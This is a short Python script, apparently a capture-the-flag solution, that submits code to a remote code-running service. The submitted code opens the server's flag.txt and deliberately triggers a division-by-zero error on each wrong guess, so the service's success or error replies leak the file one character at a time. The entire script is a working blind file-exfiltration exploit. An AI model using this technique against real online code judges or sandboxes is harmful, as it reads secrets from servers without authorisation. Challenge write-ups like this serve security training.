import requests


def success(resp_text):
    return '"error":false' in resp_text


chars = "_!0123456789abcdefghijklmnopqrstuvwxyz"
# chars = "_!012"

url = "https://yeetcode.be.ax/yeetyeet"

template = """def f(a, b):
  return a + b

with open("./flag.txt", "r") as file:
  flag = file.read().strip()
  if flag[{}] == "{}":
    pass
  else:
    error = 1/0"""

result = ""

for i in range(7, 31):
    is_found = False
    for char in chars:
        code = template.format(i, char)
        response = requests.post(url, data=code)
        print(i, char, success(response.text))

        if success(response.text):
            result += char
            is_found = True
            break

    if not is_found:
        result += "?"

    print("partial result: ", result)

print("result:", result)
